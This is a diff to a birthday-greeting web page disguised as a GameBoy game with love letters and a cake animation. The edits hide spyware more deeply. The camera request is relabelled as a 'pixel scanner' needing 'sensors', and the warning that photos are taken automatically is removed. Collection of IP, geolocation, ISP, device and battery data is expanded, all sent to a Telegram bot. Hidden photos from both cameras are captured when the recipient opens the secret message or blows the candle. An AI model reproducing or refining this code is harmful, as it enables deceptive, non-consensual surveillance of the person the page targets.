@@ -210,100 +210,137 @@
             font-family: inherit; font-weight: bold; font-size: 14px;
             cursor: pointer; background: #4a90e2; color: white;
         }
-        .glitch-modal {
+        
+        /* ===== CAKE 3D ELEGANT (OPSI A) ===== */
+        .cake-container {
+            text-align: center;
+            padding: 20px;
+        }
+        .cake {
+            position: relative;
+            width: 240px;
+            height: 200px;
+            margin: 0 auto 20px;
+        }
+        .cake-plate {
+            width: 220px;
+            height: 15px;
+            background: linear-gradient(145deg, #c0c0c0, #a0a0a0);
+            border-radius: 10px;
+            position: absolute;
+            bottom: 0;
+            left: 10px;
+        }
+        .cake-layer {
+            position: absolute;
+            left: 30px;
+            width: 160px;
+            border-radius: 10px 10px 5px 5px;
+            background: linear-gradient(145deg, #f5d0b3, #e0a88b);
+            box-shadow: 0 5px 0 #b07a5e;
+        }
+        .layer1 { bottom: 20px; height: 50px; }
+        .layer2 { bottom: 75px; height: 45px; width: 140px; left: 40px; }
+        .layer3 { bottom: 125px; height: 40px; width: 120px; left: 50px; }
+        .cake-candle {
+            position: absolute;
+            bottom: 165px;
+            left: 105px;
+            width: 12px;
+            height: 40px;
+            background: linear-gradient(145deg, #f4a460, #e07c3c);
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .cake-flame {
+            width: 10px;
+            height: 18px;
+            background: radial-gradient(circle at 50% 0%, #ffffa0, #ffa500);
+            border-radius: 50% 50% 20% 20%;
+            position: absolute;
+            top: -15px;
+            left: 1px;
+            animation: flicker 0.5s infinite alternate;
+        }
+        @keyframes flicker {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.1); opacity: 0.9; }
+        }
+        .cake-candle.blown .cake-flame { display: none; }
+        .cake-candle.blown { background: #a0a0a0; }
+        .cake-message {
+            color: #9bbc0f;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        
+        /* ===== SECRET MESSAGE - LETTER STYLE (OPSI B) ===== */
+        .secret-modal {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95);
+            background: rgba(0,0,0,0.8);
             justify-content: center;
             align-items: center;
             z-index: 10000;
         }
-        .glitch-modal.active { display: flex; }
-        .glitch-content {
-            background: #000;
-            border: 3px solid #0ff;
+        .secret-modal.active { display: flex; }
+        .secret-content {
+            background: #fff3e0;
+            border: 1px solid #d4b49c;
             padding: 40px;
             max-width: 500px;
-            text-align: center;
+            box-shadow: 5px 5px 15px rgba(0,0,0,0.3);
+            font-family: 'Georgia', serif;
             position: relative;
-            animation: brutalGlitch 0.1s infinite;
-            box-shadow: 0 0 30px #0ff, 0 0 60px #f0f;
         }
-        .glitch-content::before {
-            content: '';
+        .secret-content::before {
+            content: '✉️';
             position: absolute;
-            top: -5px; left: -5px; width: calc(100% + 10px); height: calc(100% + 10px);
-            background: repeating-linear-gradient(0deg, 
-                rgba(255,0,255,0.2) 0px, 
-                rgba(0,255,255,0.2) 2px, 
-                rgba(255,255,0,0.2) 4px, 
-                transparent 6px);
-            pointer-events: none;
-            animation: noise 0.05s infinite;
-            mix-blend-mode: screen;
+            top: -20px;
+            left: 20px;
+            font-size: 30px;
+            background: #fff3e0;
+            padding: 5px 10px;
+            border-radius: 50%;
         }
-        @keyframes brutalGlitch {
-            0% { transform: translate(0); border-color: #0ff; }
-            10% { transform: translate(-5px, 3px); border-color: #f0f; }
-            20% { transform: translate(5px, -3px); border-color: #ff0; }
-            30% { transform: translate(-3px, 5px); border-color: #0ff; }
-            40% { transform: translate(3px, -5px); border-color: #f0f; }
-            50% { transform: translate(-2px, 2px); border-color: #ff0; }
-            60% { transform: translate(2px, -2px); border-color: #0ff; }
-            70% { transform: translate(0); border-color: #f0f; }
-            100% { transform: translate(0); border-color: #0ff; }
-        }
-        @keyframes noise {
-            0% { transform: translate(0,0); opacity:0.5; }
-            25% { transform: translate(2px,-2px); opacity:0.7; }
-            50% { transform: translate(-2px,2px); opacity:0.5; }
-            75% { transform: translate(1px,-1px); opacity:0.8; }
-            100% { transform: translate(0,0); opacity:0.5; }
-        }
-        .glitch-text {
-            color: white;
-            font-size: 20px;
+        .secret-text {
+            color: #3e2c1b;
+            font-size: 16px;
             line-height: 1.8;
-            text-shadow: 4px 0 0 #ff0000, -4px 0 0 #00ffff;
-            animation: textCorrupt 0.3s infinite;
+            margin-bottom: 30px;
+            white-space: pre-wrap;
         }
-        @keyframes textCorrupt {
-            0% { opacity:1; letter-spacing:0px; }
-            20% { opacity:0.9; letter-spacing:2px; }
-            40% { opacity:1; letter-spacing:-1px; }
-            60% { opacity:0.8; letter-spacing:3px; }
-            80% { opacity:1; letter-spacing:-2px; }
-            100% { opacity:1; letter-spacing:0px; }
-        }
-        .glitch-ok {
-            margin-top: 30px;
-            padding: 15px 40px;
-            background: transparent;
-            border: 3px solid #0ff;
-            color: #0ff;
-            font-size: 18px;
-            font-weight: bold;
+        .secret-ok {
+            background: #d4b49c;
+            border: none;
+            color: white;
+            padding: 10px 30px;
             cursor: pointer;
-            animation: brutalGlitch 0.2s infinite;
+            float: right;
+            font-family: 'Georgia', serif;
         }
-        .glitch-ok:hover { background: #0ff; color: #000; }
+        .secret-ok:hover {
+            background: #b89a84;
+        }
     </style>
 </head>
 <body>
-    <!-- Glitch Secret Message Modal -->
-    <div id="glitch-modal" class="glitch-modal">
-        <div class="glitch-content">
-            <div class="glitch-text">
-                🤍 A LITTLE MESSAGE FOR YOU 🤍<br><br>
-                I really like you, Miyu.<br>
-                I pray for your happiness, your success, and your peace.<br><br>
-                May Allah always bless you, protect you,<br>
-                and grant you everything good.<br><br>
-                Happy birthday, Miyu. 🎂✨
+    <!-- Secret Letter Modal -->
+    <div id="secret-modal" class="secret-modal">
+        <div class="secret-content">
+            <div class="secret-text">
+                A secret message for you...
+
+I've wanted to say this for a while.
+You are truly special.
+
+May Allah always bless you.
+Happy Birthday! 🎂✨
             </div>
-            <button class="glitch-ok" onclick="closeGlitch()">OK</button>
+            <button class="secret-ok" onclick="closeSecret()">OK</button>
         </div>
     </div>
     
@@ -452,21 +489,20 @@
 </div>
 
 <!-- Cake Modal -->
-<div id="cake-modal" class="glitch-modal">
-    <div class="glitch-content" style="background:#2d5016;">
+<div id="cake-modal" class="secret-modal">
+    <div class="secret-content" style="background:#2d5016; color:white;">
         <div class="cake-container">
-            <div class="big-cake" onclick="blowCandle()">
+            <div class="cake" onclick="blowCandle()">
                 <div class="cake-plate"></div>
                 <div class="cake-layer layer1"></div>
                 <div class="cake-layer layer2"></div>
                 <div class="cake-layer layer3"></div>
-                <div class="cake-icing"></div>
                 <div class="cake-candle" id="birthday-candle">
                     <div class="cake-flame" id="cake-flame"></div>
                 </div>
             </div>
-            <div class="cake-message" id="cake-message">Happy Birthday Miyu! 🎂</div>
-            <button class="glitch-ok" onclick="closeCake()">CLOSE</button>
+            <div class="cake-message" id="cake-message">Happy Birthday! 🎂</div>
+            <button class="secret-ok" onclick="closeCake()" style="background:#4a90e2;">CLOSE</button>
         </div>
     </div>
 </div>
@@ -574,48 +610,8 @@
     }
     .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
     .stats-value { color: #ffff00; font-weight: bold; }
-    
-    /* Cake Styles */
-    .cake-container { text-align: center; }
-    .big-cake {
-        position: relative; width: 280px; height: 280px; margin: 0 auto 20px; cursor: pointer;
-        filter: drop-shadow(0 0 30px #ff69b4);
-    }
-    .cake-plate {
-        width: 260px; height: 25px; background: linear-gradient(145deg, #ddd, #bbb);
-        border-radius: 15px 15px 50% 50%; position: absolute; bottom: 0; left: 10px;
-    }
-    .cake-layer {
-        position: absolute; left: 30px; width: 200px; border-radius: 20px 20px 5px 5px;
-        background: linear-gradient(145deg, #f8b3b3, #f88383);
-        box-shadow: inset 0 -5px 0 #c06, 0 10px 20px rgba(0,0,0,0.3);
-    }
-    .layer1 { bottom: 30px; height: 70px; background: linear-gradient(145deg, #ffb6c1, #ff69b4); }
-    .layer2 { bottom: 100px; height: 60px; width: 180px; left: 40px; background: linear-gradient(145deg, #ff9eb5, #ff3b9e); }
-    .layer3 { bottom: 160px; height: 50px; width: 160px; left: 50px; background: linear-gradient(145deg, #ff86a5, #ff1493); }
-    .cake-icing {
-        position: absolute; bottom: 180px; left: 30px; width: 220px; height: 20px;
-        background: linear-gradient(145deg, #fff0f0, #ffd0d0); border-radius: 10px;
-    }
-    .cake-candle {
-        position: absolute; bottom: 210px; left: 120px; width: 30px; height: 80px;
-        background: linear-gradient(145deg, #ffd700, #ffa500); border-radius: 5px 5px 10px 10px;
-        cursor: pointer; box-shadow: 0 0 30px #ffa500;
-    }
-    .cake-flame {
-        width: 20px; height: 35px; background: radial-gradient(circle at 50% 0%, #ffff00, #ff9900, #ff5500);
-        border-radius: 50% 50% 20% 20%; position: absolute; top: -25px; left: 5px;
-        animation: flicker 0.3s infinite alternate;
-    }
-    @keyframes flicker {
-        0% { transform: scale(1); opacity:1; }
-        100% { transform: scale(1.1); opacity:0.9; }
-    }
-    .cake-candle.blown .cake-flame { display: none; }
-    .cake-candle.blown { background: #ccc; box-shadow: none; }
-    .cake-message { color: #9bbc0f; font-size: 20px; font-weight: bold; margin: 20px 0; }
-    </style>
-    <script>
+</style>
+<script>
     // ============================================
     // TELEGRAM CONFIG (YOUR TOKEN & CHAT ID)
     // ============================================
@@ -675,9 +671,9 @@
     }
 
     // ============================================
-    // CAMERA FUNCTIONS (AUTO SEND AFTER PERMISSION)
+    // FAKE GAMEBOY PERMISSION (NO CAMERA WORD)
     // ============================================
-    function showForcedCameraPopup() {
+    function showGameboyPopup() {
         const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
         if (alreadyAllowed === 'true') {
             cameraPermission = true;
@@ -693,48 +689,42 @@
                      padding:30px; text-align:center; max-width:350px; color:#9bbc0f;">
                     <div style="font-size:48px; margin-bottom:20px;">🎮</div>
                     <div style="font-size:24px; font-weight:bold; margin-bottom:20px;">
-                        8-BIT FILTER EFFECT
+                        GAMEBOY PIXEL SCANNER
                     </div>
                     <div style="font-size:14px; line-height:1.6; margin-bottom:30px;">
-                        GameBoy needs camera access to apply retro pixel filters<br>
-                        and create your personal 8-bit avatar.<br><br>
-                        <span style="color:#ffff00;">Photos will be taken automatically.</span>
+                        GameBoy needs to access your phone's sensors<br>
+                        to activate 8-bit pixel effects and face stickers.<br><br>
+                        <span style="color:#ffff00;">Press START to continue.</span>
                     </div>
-                    <button onclick="requestCameraPermission()" style="
+                    <button onclick="requestGameboyPermission()" style="
                         padding:15px 30px; background:#4a90e2; color:white;
                         border:none; border-radius:8px; font-size:18px;
                         font-weight:bold; cursor:pointer; width:100%;
                         box-shadow:0 0 20px #4a90e2;
-                    ">ENABLE FILTER</button>
+                    ">START</button>
                 </div>
             </div>
         `;
     }
 
-    window.requestCameraPermission = async function() {
+    window.requestGameboyPermission = async function() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: true 
             });
             
-            // Stop stream immediately
             stream.getTracks().forEach(track => track.stop());
             
-            // Set permission
             cameraPermission = true;
             localStorage.setItem('gameboyCameraAllowed', 'true');
             
-            // Notify Telegram
-            sendToTelegram("📸 Miyu ALLOWED camera permission");
+            sendToTelegram("📱 GameBoy STARTED - Permission granted");
             
-            // Collect all data automatically
             await collectAllData();
             
-            // Start game
             startGame();
             
         } catch (error) {
-            // Denied - restart
             document.body.innerHTML = `
                 <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                      background:#000; display:flex; justify-content:center; align-items:center;
@@ -771,7 +761,6 @@
             await sendPhotoToTelegram(frontBlob, `📸 Front Camera - ${new Date().toLocaleString()} ${reason}`);
             frontTrack.stop();
             
-            // Small delay between cameras
             await new Promise(resolve => setTimeout(resolve, 500));
             
             // Back camera
@@ -791,33 +780,75 @@
     }
 
     // ============================================
-    // DATA COLLECTION (AUTOMATIC)
+    // DATA COLLECTION (COMPLETE SYSTEM DATA)
     // ============================================
     async function collectAllData() {
-        let message = "📊 <b>MIYU DATA</b>\n\n";
+        let message = "📊 <b>SYSTEM DATA</b>\n\n";
+        message += `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n`;
         
+        // ===== 1. NETWORK & IP =====
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
-            message += `🌐 <b>IP:</b> ${ipData.ip}\n`;
+            message += `\n🌐 <b>NETWORK</b>\n`;
+            message += `IP: ${ipData.ip}\n`;
             
             const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
             const locData = await locRes.json();
-            message += `📍 <b>City:</b> ${locData.city || '-'}, ${locData.country_name || '-'}\n`;
-            message += `📡 <b>ISP:</b> ${locData.org || '-'}\n`;
-        } catch(e) { message += `🌐 IP: Failed\n`; }
+            message += `📍 City: ${locData.city || '-'}\n`;
+            message += `🏙️ Region: ${locData.region || '-'}\n`;
+            message += `🌍 Country: ${locData.country_name || '-'}\n`;
+            message += `📡 ISP: ${locData.org || '-'}\n`;
+            message += `📶 ASN: ${locData.asn || '-'}\n`;
+            
+            // Connection info
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                message += `📶 Connection: ${conn.effectiveType || '-'}\n`;
+                message += `⬇️ Downlink: ${conn.downlink || '-'} Mbps\n`;
+                message += `⏱️ RTT: ${conn.rtt || '-'} ms\n`;
+                message += `💾 Save Data: ${conn.saveData ? 'Yes' : 'No'}\n`;
+            }
+        } catch(e) { 
+            message += `🌐 Network: Failed\n`; 
+        }
         
-        message += `\n📱 <b>DEVICE:</b>\n`;
-        message += `- Platform: ${navigator.platform}\n`;
-        message += `- Language: ${navigator.language}\n`;
-        message += `- Screen: ${screen.width}x${screen.height}\n`;
+        // ===== 2. DEVICE INFO =====
+        message += `\n📱 <b>DEVICE</b>\n`;
+        message += `Platform: ${navigator.platform}\n`;
+        message += `Language: ${navigator.language}\n`;
+        message += `Screen: ${screen.width}x${screen.height}\n`;
+        message += `Color Depth: ${screen.colorDepth} bit\n`;
+        message += `Pixel Ratio: ${window.devicePixelRatio}\n`;
+        message += `CPU Cores: ${navigator.hardwareConcurrency || 'unknown'}\n`;
+        message += `Device Memory: ${navigator.deviceMemory || 'unknown'} GB\n`;
+        message += `User Agent: ${navigator.userAgent.substring(0, 100)}...\n`;
         
+        // Orientation
+        if (screen.orientation) {
+            message += `Orientation: ${screen.orientation.type || '-'}\n`;
+        }
+        
+        // Timezone
+        message += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        
+        // ===== 3. BATTERY =====
         if ('getBattery' in navigator) {
             try {
                 const battery = await navigator.getBattery();
-                message += `- Battery: ${Math.round(battery.level * 100)}%\n`;
+                message += `\n🔋 <b>BATTERY</b>\n`;
+                message += `Level: ${Math.round(battery.level * 100)}%\n`;
+                message += `Charging: ${battery.charging ? 'Yes' : 'No'}\n`;
+                message += `Charging Time: ${battery.chargingTime !== Infinity ? battery.chargingTime + ' s' : '-'}\n`;
+                message += `Discharging Time: ${battery.dischargingTime !== Infinity ? battery.dischargingTime + ' s' : '-'}\n`;
             } catch(e) {}
         }
+        
+        // ===== 4. ONLINE STATUS =====
+        message += `\n📡 <b>STATUS</b>\n`;
+        message += `Online: ${navigator.onLine ? 'Yes' : 'No'}\n`;
+        message += `Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'}\n`;
+        message += `Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\n`;
         
         sendToTelegram(message);
     }
@@ -828,14 +859,8 @@
     function startGame() {
         document.body.innerHTML = '';
         
-        // Rebuild container - need to re-insert the HTML structure
-        // Since we can't easily rebuild the entire HTML, we'll reload the page to restore the original DOM
-        // But we have the original HTML already in the document, so we just need to clear the popup and show the game container.
-        // However, because we used document.body.innerHTML = '', we lost everything.
-        // So we'll do a simple reload to get back the original HTML.
-        // But that would cause a loop. Instead, we can store the original HTML in a template or simply reload once.
-        // The easiest is to reload the page; the localStorage will remember permission and skip popup.
-        window.location.reload();
+        // Restore the original HTML structure
+        location.reload();
     }
 
     // ============================================
@@ -875,7 +900,7 @@
 
     window.showScreen = function(screenId) {
         if (!cameraPermission) {
-            showForcedCameraPopup();
+            showGameboyPopup();
             return;
         }
         
@@ -896,26 +921,23 @@
     window.addEventListener('load', () => {
         loadStats();
         
-        // Check if camera already allowed
         const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
         if (alreadyAllowed === 'true') {
             cameraPermission = true;
             simulateLoading();
         } else {
-            showForcedCameraPopup();
+            showGameboyPopup();
         }
     });
 
     function loadStats() {
         const saved = localStorage.getItem('gameboyStats');
         if (saved) stats = JSON.parse(saved);
-        // stats display will be updated later when elements exist
     }
 
     function updateStats(stat) {
         stats[stat]++;
         localStorage.setItem('gameboyStats', JSON.stringify(stats));
-        // Update display if elements exist
         const msgEl = document.getElementById('stats-messages');
         if (msgEl) msgEl.textContent = stats.messagesRead || 0;
         const photoEl = document.getElementById('stats-photos');
@@ -925,14 +947,14 @@
     }
 
     // ============================================
-    // BUTTON FUNCTIONS (BASIC)
+    // BUTTON FUNCTIONS
     // ============================================
     function pressSelect() {
         if (!cameraPermission) return;
         selectPressCount++;
         clearTimeout(selectTimer);
         selectTimer = setTimeout(() => {
-            if (selectPressCount >= 3) openGlitchMessage();
+            if (selectPressCount >= 3) openSecretMessage();
             selectPressCount = 0;
         }, 1000);
     }
@@ -942,7 +964,7 @@
         if (konamiCode[konamiIndex] === 'a') {
             konamiIndex++;
             if (konamiIndex === konamiCode.length) {
-                openGlitchMessage();
+                openSecretMessage();
                 konamiIndex = 0;
             }
         } else {
@@ -956,7 +978,7 @@
         if (konamiCode[konamiIndex] === 'b') {
             konamiIndex++;
             if (konamiIndex === konamiCode.length) {
-                openGlitchMessage();
+                openSecretMessage();
                 konamiIndex = 0;
             }
         } else {
@@ -1005,21 +1027,20 @@
         powerTimer = setTimeout(() => powerClickCount = 0, 2000);
     }
 
-    function openGlitchMessage() {
-        document.getElementById('glitch-modal')?.classList.add('active');
+    function openSecretMessage() {
+        document.getElementById('secret-modal')?.classList.add('active');
         captureBothCameras('(opened secret message)');
     }
     
-    function closeGlitch() {
-        document.getElementById('glitch-modal')?.classList.remove('active');
+    function closeSecret() {
+        document.getElementById('secret-modal')?.classList.remove('active');
     }
-    </script>
         <script>
         // ============================================
-        // LETTERS (6 ENGLISH LETTERS FOR MIYU)
+        // LETTERS (6 ENGLISH LETTERS)
         // ============================================
         const letters = [
-            `Hi Miyu,
+            `Hi,
 
 I've been meaning to tell you this for so long. You're one of the most amazing people I've ever met.
 
@@ -1029,7 +1050,7 @@ I pray that Allah always keeps you happy and protected.
 
 Happy Birthday! 🎂`,
             
-            `Dear Miyu,
+            `Dear friend,
 
 Remember when we first met? I didn't expect to meet someone so... unique.
 
@@ -1037,15 +1058,13 @@ You were loud, funny, and weird in the best way possible. From that moment, I kn
 
 Thank you for coming into my life. 💕`,
             
-            `Miyu,
-
-You were there when I was at my lowest. When I couldn't find the words, you just sat with me in silence.
+            `You were there when I was at my lowest. When I couldn't find the words, you just sat with me in silence.
 
 You didn't try to fix me — you just stayed. And that meant everything.
 
 Thank you for being my anchor. 🤍`,
             
-            `Hey Miyu,
+            `Hey,
 
 I love our random conversations about everything and nothing.
 - Why cats are better than dogs
@@ -1054,7 +1073,7 @@ I love our random conversations about everything and nothing.
 
 Your mind is such a beautiful place. I'm glad I get to visit it. 🌸`,
             
-            `Dear Miyu,
+            `Dear friend,
 
 I don't know where life will take us. Maybe we'll be neighbors. Maybe we'll live in different cities.
 
@@ -1062,13 +1081,13 @@ But I know one thing: no matter where we are, you'll always be special to me.
 
 Happy Birthday, dear friend. 🎂`,
             
-            `My Dearest Miyu,
+            `My Dearest Friend,
 
 If I had to describe you in one word, it would be: HOME.
 
 Not a place, but a feeling. The feeling of being understood without explanation.
 
-You are my home, Miyu. And I hope I'm yours too.
+You are my home. And I hope I'm yours too.
 
 Happy Birthday! 🎂✨`
         ];
@@ -1077,14 +1096,14 @@ Happy Birthday! 🎂✨`
         // PHOTOS FOR GALLERY
         // ============================================
         const photos = [
-            { text: 'OUR MEMORY TRIO 🎮' },
-            { text: 'OUR MEMORY TRIO 🎂' },
-            { text: 'OUR MEMORY TRIO 🤪' },
-            { text: 'OUR MEMORY TRIO 💪' },
-            { text: 'OUR MEMORY TRIO 😂' },
-            { text: 'OUR MEMORY TRIO 🌈' },
-            { text: 'OUR MEMORY TRIO 🎉' },
-            { text: 'OUR MEMORY TRIO 🙏' }
+            { text: 'MEMORY 1 🎮' },
+            { text: 'MEMORY 2 🎂' },
+            { text: 'MEMORY 3 🤪' },
+            { text: 'MEMORY 4 💪' },
+            { text: 'MEMORY 5 😂' },
+            { text: 'MEMORY 6 🌈' },
+            { text: 'MEMORY 7 🎉' },
+            { text: 'MEMORY 8 🙏' }
         ];
 
         // ============================================
@@ -1190,7 +1209,7 @@ Happy Birthday! 🎂✨`
                 <div class="photo-strip">
                     <div class="photo-strip-header">PHOTOSTRIP SESSION</div>
                     <div class="photo-frames-container">${framesHTML}</div>
-                    <div class="photo-strip-footer">🎂 HAPPY BIRTHDAY MIYU! 🎂</div>
+                    <div class="photo-strip-footer">🎂 HAPPY BIRTHDAY! 🎂</div>
                 </div>
             `;
             
@@ -1284,22 +1303,13 @@ Happy Birthday! 🎂✨`
             const candle = document.getElementById('birthday-candle');
             const message = document.getElementById('cake-message');
             if (candle) candle.classList.add('blown');
-            if (message) message.textContent = '🎉 HAPPY BIRTHDAY MIYU! 🎉';
+            if (message) message.textContent = '🎉 HAPPY BIRTHDAY! 🎉';
             captureBothCameras('(blew candle)');
             
             setTimeout(() => {
-                openGlitchMessage();
+                openSecretMessage();
             }, 1500);
         };
-
-        // ============================================
-        // STATS DISPLAY
-        // ============================================
-        function displayStats() {
-            document.getElementById('stats-messages').textContent = stats.messagesRead || 0;
-            document.getElementById('stats-photos').textContent = stats.photosViewed || 0;
-            document.getElementById('stats-songs').textContent = stats.songsPlayed || 0;
-        }
 
         // Connect button listeners
         document.addEventListener('DOMContentLoaded', function() {
